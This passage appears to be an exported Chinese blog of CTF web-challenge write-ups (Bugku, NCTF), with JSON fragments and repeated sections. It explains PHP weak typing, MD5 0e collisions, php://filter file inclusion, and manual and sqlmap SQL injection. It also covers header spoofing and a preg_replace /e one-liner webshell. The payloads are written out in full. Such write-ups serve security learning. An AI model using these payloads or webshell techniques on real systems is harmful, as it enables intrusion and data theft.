在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较 测试代码 &lt;?php var_dump(\"admin\"==0); //true var_dump(\"1admin\"==1); //true var_dump(\"admin1\"==1) //false var_dump(\"admin1\"==0) //true var_dump(\"0e123456\"==\"0e4456789\"); //true ?&gt; //上述代码可自行测试 1 观察上述代码，\"admin\"==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0自然和0相等 2 \"1admin\"==1 比较的时候会将1admin转化成数值,结果为1，而“admin1“==1 却等于错误，也就是\"admin1\"被转化成了0,为什么呢？？ 3 \"0e123456\"==\"0e456789\"相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 web3查看源码后，在最下面看到一串编码，为unicode编码 &amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125; 使用工具转换为字符串 域名解析dns服务器用来解析域名为IP，很多国外的服务器不能访问，主要原因就是DNS服务器不能解析那些域名 hosts就是本地用来解析域名为IP 因此hosts文件中有的域名记录，在本电脑浏览器中可直接使用域名访问 （hosts文件需要管理员权限，修改方式为使用管理员权限运行记事本后打开hosts） 路径为： C:\\Windows\\System32\\drivers\\etc 文件保存后在浏览器中访问该域名 获得flag 你必须让他停下打开页面什么也没有，源码也没有什么发现，抓包试试 go完也没什么反应，有点迷惑 但是多go几次后，发现有张图片在变 多go几次就出来了flag,原理还未知 变量1 &lt;?php error_reporting(0); include \"flag1.php\"; highlight_file(__file__); if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match(\"/^\\w+$/\",$args))&#123; die(\"args error!\"); &#125; eval(\"var_dump($$args);\"); &#125; ?&gt; 首先看到要用get方式提交一个args参数，而在最后一行代码里又有var_dump(&amp;&amp;args)，于是传入args参数的值为GLOBALS,这样最后一行代码就变成了var_dump（&amp;GLOBALS），然后var_dump函数运行会输出所有变量，得出flag。 Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include或require的所有文件。 GLOBALS:一个包含了全部变量的全局组合数组 即将include”flag.php”作为全局变量在本页面输出 ?args=GLOBALS web5源码中一串特别的代码直接放在浏览器的控制台中运行 头等舱打开页面什么也没有 扫描目录，扫出来一大堆没用的，直接抓包 。。。。就出来了 网站被黑名字提示了，网站被黑。 打开题目，发现鼠标动不了，可能是被黑后的后遗症 先扫描目录发现了shell.php,这可能是上次黑客留下的小马文件 打开页面，需要密码，这就需要爆破了(查看了wp,知道了密码为hack,不知道时就需要一个足够大的密码字典才能破解) 确定要爆破的变量 加载密码字典 出现结果（根据length确定密码） 密码为hack 登录即可 管理员系统随便输入一个账号发现提示IP 想到了X-FORWORADED-FOR:127.0.0.1 抓包试试 在响应包中发现一段base64编码dGVzdDEyMw== 解密后为test123，猜测为登录密码 结果真对了 当然这题也可以使用爆破的方法做，但是密码字典需要包含test123 web4查看源码发现一段js代码 将最后的eval改成alert(),直接在浏览器中运行弹出结果 function checkSubmit()&#123; var a=document.getElementById(\"password\"); if(\"undefined\"!=typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\"==a.value) return!0; alert(\"Error\"); a.focus(); return!1&#125; &#125; document.getElementById(\"levelQuest\").onsubmit=checkSubmit; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value) 直接输入67d709b2b54aa2aa648cf6e87a7114f1 flag在index里题目已经提示了flag的位置应该在index.php中，那么获取index.php的源码就很关键，可是查看源码什么也没有 注意到了url:http://123.206.87.240:8005/post/index.php?file=show.php 出现file这个参数，想到了文件包含的漏洞 用下面的payload,获取index.php，源码的base64值 ?file=php://filter/read=convert.base64-encode/resource=index.php PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg== 解码为 &lt;html&gt; &lt;title&gt;Bugku-ctf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:flag&#123;edulcni_elif_lacol_si_siht&#125; ?&gt; &lt;&#x2F;html&gt; 获取flag{edulcni_elif_lacol_si_siht} 请输入密码提示了5位数的密码，直接爆破 备份是个好习惯打开题目后，出现一段代码，应该是md5值，可是解码为空密码 扫描目录python dirsearch.py -u http://123.206.87.240:8002/web16/ -e php 发现了index.php.bak 这个应该是在编辑这个文件时，自动生成的备份文件；EDITPLUS 这类的文本编辑器在编辑文件时会产生这样的备份；如果编辑后没有什么问题；可以删除.BAK文件 (来自百度) 下载.bak文件打开后，发现源码，开始审计 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \"flag.php\"; ini_set(\"display_errors\", 0); $str = strstr($_SERVER['REQUEST_URI'], '?'); $str = substr($str,1); $str = str_replace('key','',$str);//对key进行了过滤 parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;//这里需要使用md()函数对数组处理时的漏洞 echo $flag.\"取得flag\"; &#125; ?&gt; url:http://123.206.87.240:8002/web16/index.php?kekeyy1[]=an&amp;kekeyy2[]=ss 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 成绩单1' and 1=1 # 1' and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4 #可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) 秋名山车神看到题目就知道需要用python的脚本来做（菜鸡不配），网上找的脚本 import requests import re url='http://120.24.86.145:8002/qiumingshan/' r=requests.session() requestpage = r.get(url) ans=re.findall('&lt;div&gt;(.*?)=?;&lt;/div&gt;',requestpage.text)#获取表达式，我正则写的好像有点问题，多匹配了最后的=?两个字符 ans=\"\".join(ans)#列表转为字符串 ans=ans[:-2]#去掉最后的=? post=eval(ans)#计算表达式的值 data=&#123;'value':post&#125;#构造post的data部分 flag=r.post(url,data=data) print(flag.text)","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"域名解析","slug":"域名解析","permalink":"https://sunzhengyu99.github.io/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/"},{"name":"爆破","slug":"爆破","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%86%E7%A0%B4/"},{"name":"脚本","slug":"脚本","permalink":"https://sunzhengyu99.github.io/tags/%E8%84%9A%E6%9C%AC/"}]},{"title":"综合2","date":"2020-09-03T07:24:29.000Z","path":"2020/09/03/综合2/","text":"NCTF-综合2 进入页面，没什么特别的地方，随便点点 留言可以正常提交，本以为有xss,但是已经提示不是xss 看到最下面有个网站说明 本CMS说明 ，有用的内容如下 config.php：存放数据库信息，移植此CMS时要修改 index.php：主页文件 passencode.php：Funny公司自写密码加密算法库 say.php：用于接收和处理用户留言请求 sm.txt：本CMS的说明文档 sae的information_schema表好像没法检索 admin表结构 create table admin ( id integer, username text, userpass text, ) http://cms.nuptzj.cn/about.php?file=sm.txt可以使用php伪协议任意读取文件内容。 包括自己 尝试读取index.php的源码，发现好像并没有什么用 读取about.php &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;?php $file&#x3D;$_GET[&#39;file&#39;]; if($file&#x3D;&#x3D;&quot;&quot; || strstr($file,&#39;config.php&#39;))&#123; &#x2F;&#x2F; 有config.php echo &quot;file参数不能为空！&quot;; exit(); &#125;else&#123; $cut&#x3D;strchr($file,&quot;loginxlcteam&quot;); &#x2F;&#x2F;包含了 loginxlcteam页面 if($cut&#x3D;&#x3D;false)&#123; $data&#x3D;file_get_contents($file); $date&#x3D;htmlspecialchars($data); echo $date; &#125;else&#123; echo &quot;&lt;script&gt;alert(&#39;敏感目录，禁止查看！但是。。。&#39;)&lt;&#x2F;script&gt;&quot;; &#125; &#125; 读取config.php，无有用信息 查看loginxlcteam,是个登录页面 到此还是无从下手，参考大佬的博客 https://blog.csdn.net/zz_Caleb/article/details/88652838?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.nonecase 在搜索页面中也存在有用信息 http://cms.nuptzj.cn/about.php?file=so.php获取源码 &lt;?php //so.php if($_SERVER['HTTP_USER_AGENT']!=\"Xlcteam Browser\")&#123; //必须修改http头，吧user-agent改成Xlcteam Browser echo '万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'; exit(); &#125; $id=$_POST['soid']; //post 一个soid include 'config.php'; include 'antiinject.php'; //防注入的文件 include 'antixss.php'; //防xss的文件 $id=antiinject($id); //对id过滤 $con = mysql_connect($db_address,$db_user,$db_pass) or die(\"不能连接到数据库！！\".mysql_error()); mysql_select_db($db_name,$con); $id=mysql_real_escape_string($id); $result=mysql_query(\"SELECT * FROM `message` WHERE display=1 AND id=$id\"); //sql查询，可能存在注入点 $rs=mysql_fetch_array($result); echo htmlspecialchars($rs['nice']).':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'.antixss($rs['say']).'&lt;br /&gt;'; mysql_free_result($result); mysql_free_result($file); mysql_close($con); ?&gt; &lt;?php //antiinject.php源码 function antiinject($content) &#123; $keyword=array(\"select\",\"union\",\"and\",\"from\",' ',\"'\",\";\",'\"',\"char\",\"or\",\"count\",\"master\",\"name\",\"pass\",\"admin\",\"+\",\"-\",\"order\",\"=\"); //对一些sql注入时用到的关键词进行了过滤 $info=strtolower($content); for($i=0;$i&lt;=count($keyword);$i++) &#123; $info=str_replace($keyword[$i], '',$info); &#125; return $info; &#125; ?&gt; 大致意思就是 1.判断http请求头中的user-agent参数是否为Xlcteam Browser 2.post参数soid 3.对soid进行过滤后带入sql语句中查询 于是抓包修改user-agent 确定存在注入点 由于之前提示了admin表结构 create table admin ( id integer, username text, userpass text, ) 可直接写出查询语句 (sselectelect/**/group_concat(userppassass)/**/ffromrom/**/aadmindmin) ASCII码转字符串结果为： fuckruntu 登录 http://cms.nuptzj.cn/about.php?file=xlcteam.php 查看源码 &lt;?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] =&gt; '|.*|e',); array_walk($arr, $e, ''); ?&gt; 看样子是可以用菜刀连接的 那怎么利用小马呢，数组的value中是|.*|e，这里用到了正则匹配的preg_replace()的一个漏洞：参考https://www.jb51.net/article/38714.htm简单来说就是正则中/e(这里和|e效果一样) 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。所以我们可以传递preg_replace给www，这样array中的值就是第一个参数，键就是第二个参数，正好可以利用preg_replace的漏洞，然后会执行$_POST[‘wtf’]，就相当于一个一句话马了。用菜刀连接： url:http://cms.nuptzj.cn/xlcteam.php?www=preg_replace 密码：wtf 总结：算是一道比较难的题目了，涉及到知识点也很多，还需要多看看！！！","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"shell","slug":"shell","permalink":"https://sunzhengyu99.github.io/tags/shell/"}]},{"title":"nctf-2","date":"2020-09-02T09:13:08.000Z","path":"2020/09/02/nctf-2/","text":"NCTF-2 SQL注入1题目源码给出 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = trim($_POST[user]); $pass = md5(trim($_POST[pass])); $sql=\"select user from ctf where (user='\".$user.\"') and (pw='\".$pass.\"')\"; echo '&lt;/br&gt;'.$sql; $query = mysql_fetch_array(mysql_query($sql)); if($query[user]==\"admin\") &#123; echo \"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;\"; &#125; if($query[user] != \"admin\") &#123; echo(\"&lt;p&gt;You are not admin!&lt;/p&gt;\"); &#125; &#125; echo $query[user]; ?&gt; 首先post方法传递user和pass两个参数，然后带入sql语句中查询 注入点在这个位置 $sql=&quot;select user from ctf where (user=&#39;&quot;.$user.&quot;&#39;) and (pw=&#39;&quot;.$pass.&quot;&#39;)&quot; select user from ctf where (user=&#39;&#39;) and (pw=&#39;&#39;) 构造语句 select user from ctf where (user=&#39;admin&#39;) or 1=1 #) and (pw=&#39;&#39;) 在username中填入admin&#39;) or 1=1 #或者admin&#39;) and 1=1 #，提交即可获得flag passcheck$pass=@$_POST['pass']; $pass1=***********;//被隐藏起来的密码 if(isset($pass)) &#123; if(@!strcmp($pass,$pass1))&#123; echo \"flag:nctf&#123;*&#125;\"; &#125;else&#123; echo \"the pass is wrong!\"; &#125; &#125;else&#123; echo \"please input pass!\"; &#125; ?&gt; strcmp() 函数比较两个字符串。 注释：strcmp() 函数是二进制安全的，且对大小写敏感。 提示：该函数与 strncmp() 函数类似，不同的是，通过 strncmp() 您可以指定每个字符串用于比较的字符数。 只有pass==pass1时才显示flag 感觉跟之前的变量覆盖相似 知识点： strcmp()函数 ：php5.3之前的strcmp的漏洞，当参数中的一个字符串是对象或者数组时，函数会返回0； hackbar的使用，post方法 php弱类型，数组的使用。 参考： https://www.cnblogs.com/islsy/p/10667426.html 起名字真难&lt;?php function noother_says_correct($number) &#123; $one = ord('1'); $nine = ord('9'); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) //number中的数字不能在1-9 &#123; return false; &#125; &#125; return $number == '54975581388'; //number的值等于54975581388，与之前if语句矛盾 &#125; $flag='*******'; if(noother_says_correct($_GET['key'])) echo $flag; else echo 'access denied'; ?&gt; 尝试将54975581388转成十六进制 0xccccccccc, c的a值为12，满足if判断语句 ?key=0xccccccccc sqlinject查看源码 &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require 'db.inc.php'; function clean($str)&#123; if(get_magic_quotes_gpc())&#123; //防止注入 $str=stripslashes($str); //添加 \\ &#125; return htmlentities($str, ENT_QUOTES);//过滤掉单引号，双引号，或者兼而有之 &#125; $username = @clean((string)$_GET['username']);//对获取的参数进行了处理 $password = @clean((string)$_GET['password']); $query='SELECT * FROM users WHERE name=\\''.$username.'\\' AND pass=\\''.$password.'\\';';//存在注入的语句 $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1)&#123; die('Invalid password!'); &#125; echo $flag; --&gt; magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误 SELECT * FROM users WHERE name=\\&#39;&#39;.$username.&#39;\\&#39; AND pass=\\&#39;&#39;.$password.&#39;\\&#39;; 反斜杠遇到单引号后，起到转义作用，实际sql语句如下 SELECT * FROM users WHERE name=&#39;.$username.&#39; AND pass=&#39;.$password.&#39;; 这里注入与之前的注入不同，这里针对的是password SELECT * FROM users WHERE name=&#39; \\&#39; AND pass=&#39; or 1=1 --+&#39;; \\&#39; AND pass= 作为name 参数的值 所以构造?name=&amp;password=or 1=1 –+ SQL注入2&lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) &#123; //post 方式接收两个参数 mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]);//对pass md5加密 $query = @mysql_fetch_array(mysql_query(\"select pw from ctf where user='$user'\"));//获取pw字段的值 if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; // 比较pass和pw echo \"&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;\"; &#125; else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125; &#125; ?&gt; poyload: user= &#39; union select md(1) &amp;pass=1 select pw from ctf where user=&#39;&#39; union select md(1) 此查询语句获得我pw值为md(1),所以if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw])))语句成立，显示flag (还没完全理解) 综合题 首页中给出很长的jsfuck，可以使用浏览器的console解码 ,给出一个页面 访问 1bc29b36f623ba82aaf6724fd3b16718.php 提示在header里 查看header history of bash使用过linux的同志会知道，如果使用的是bash，在家目录中会生成.bash_history文件用来保存历史命令。访问.bash_history文件，可以得到这样的历史命令 url: http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 获得zip -r flagbak.zip ./* 访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip file_get_contents查看源码获取被注释的内容 $file = $_GET['file']; if(@file_get_contents($file) == \"meizijiu\")&#123; echo $nctf; &#125; 分析可得 通过get方式传递flle=文件名并且这个文件的内容==‘meizijiu’如果等于就打印flag php伪协议php://input来构造原始数据的只读流 变量覆盖参考 https://blog.csdn.net/niexinming/article/details/52637773?utm_source=blogxgwz1 源码 &lt;!--foreach($_GET as $key =&gt; $value)&#123; $$key = $value; &#125; if($name == \"meizijiu233\")&#123; echo $flag; &#125;--&gt; ?name=meizijiu233","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"弱类型","slug":"弱类型","permalink":"https://sunzhengyu99.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"php","slug":"php","permalink":"https://sunzhengyu99.github.io/tags/php/"},{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"}]},{"title":"nctf","date":"2020-08-29T14:38:08.000Z","path":"2020/08/29/nctf/","text":"nctf-1 签到题查看源码即可看到flag md5 collision一道简单的md5漏洞题目 md5函数漏洞 源码 $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\"; &#125; else &#123; echo \"false!!!\"; &#125;&#125; else&#123;echo \"please input a\";&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1('aaroZmOk') sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m') 签到2提示输入口令，尝试输入发现只能输入十个字母，但是口令有11个字母 F12审查元素，修改输入框的maxlength值，大于11即可 再次输入口令即可。 考点为前端代码修改 这题不是WEB这道题还真不是web 进入题目链接，发现一张动图，本能的将其拖入动图查看器种，结果什么都没发现，于是打开winhex 层层递进 题目为层层递进，通过F12中Sources功能，查看网站的包含情况，发现到可疑地址：SO.html，查看发现相似可以地址，最后在404.html源码中得到flag（竖排插入在标签中）： 单身二十年tip:在这里找key 点击发现url改变，跳转到了另一个页面 bp抓包试试，go一下，相应包中出现flag phpencode一开始以为是解码，结果发现代码逻辑不对，直接运行php代码，出错 将最后的eval改为echo,提交运行即可 LFI 黑盒判断方法：单纯的从URL判断的话，URL中path、dir、file、pag、page、archive、p、eng、语言文件等相关关键字眼的时候,可能存在文件包含漏洞。 根据PHP伪协议尝试构造如下Payload：?file=php://filter/read=convert.base64-encode/resource=index.php，将index.php的源码经过Base64编码输出 PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64解码 &lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125; ?&gt; &lt;&#x2F;html&gt; 单身一百年也没用与单身二十年一样，抓包即可 cookie Cookie，有时也用其复数形式 Cookies。类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息 。 TIP: 0==not bp抓包，将cookie:login = 0改cookie:login=1 go MYSQL进入题目，提示robots协议 robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。 robots协议并不是一个规范，而只是约定俗成的，所以并不能保证网站的隐私。 查看robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt TIP:sql.php //这里提示sql.php的源码如下 &lt;?php if($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125; &#125; ?&gt; 大致意思：get方式传递一个id的参数,创建一个新的参数id存放取整后的值（intval()函数将参数变为整形） 之后将新的$id带入sql语句中查询。if语句中说明，get方式传递的值不能为1024。 http://chinalover.sinaapp.com/web11/sql.php?id=10 尝试id=10，无结果 id=1024出现 no! try again，说明只有id=1024的时候才会执行if语句 想到了intval()函数的作用，尝试id=1024.1 GBK Injection宽字节注入，之前写过。 /x00if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; 试了试?nctf[]=1,出现了报错但是答案真就出来了 正儿八经的做法是?nctf=1%00%23biubiubiu，简单的代码审计 bypass again&lt;?php if (isset($_GET['a']) and isset($_GET['b'])) &#123; if ($_GET['a'] != $_GET['b']) if (md5($_GET['a']) == md5($_GET['b'])) die('Flag: '.$flag); else print 'Wrong.'; &#125; ?&gt; 代码审计，get方式传递参数a和b,二者的值不同，但是md5值不同，此处又利用md5()漏洞 在PHP中，MD5是不能处理数组的，md5(数组)会返回null，所以md5(a[])null,md5(b[])null，md5(a[])=md5(b[])=null,这样就得到答案了。 payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 伪装者bp抓包，添加X-Forwarded-For=127.0.0.1,发包即可 X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"代码审计","slug":"代码审计","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugku刷题 成绩单1' and 1=1 # 1' and 1=2 # 不显示内容，可以判断存在注入点 手工注入1.1&#39; order by 4#可正常显示可以判断存在四个字段2.爆数据库` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.爆出表名-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.字段名-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag 得到flag (select skctf_flag from skctf_flag.fl4g) sqlmap 因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中 1.获取数据库python2 sqlmap.py -r a.txt --dbs 2.获取表名python2 sqlmap.py -r a.txt -D skctf_flag --tables 3.获取列名python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.获取flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump 备份是个好习惯 扫描发现了index.php，通过 index.php.bak下载网页源码 &lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \"flag.php\"; ini_set(\"display_errors\", 0); $str = strstr($_SERVER['REQUEST_URI'], '?'); $str = substr($str,1); $str = str_replace('key','',$str); parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\"; &#125; ?&gt; 对上传的值进行了过滤key, kekeyy可以绕过 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等 payload: ?kekey1[]=da&amp;kekey2[]=dada 2.利用==比较漏洞 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。 下列的字符串的MD5值都是0e开头的： QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a 多次爆数据库名 http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() 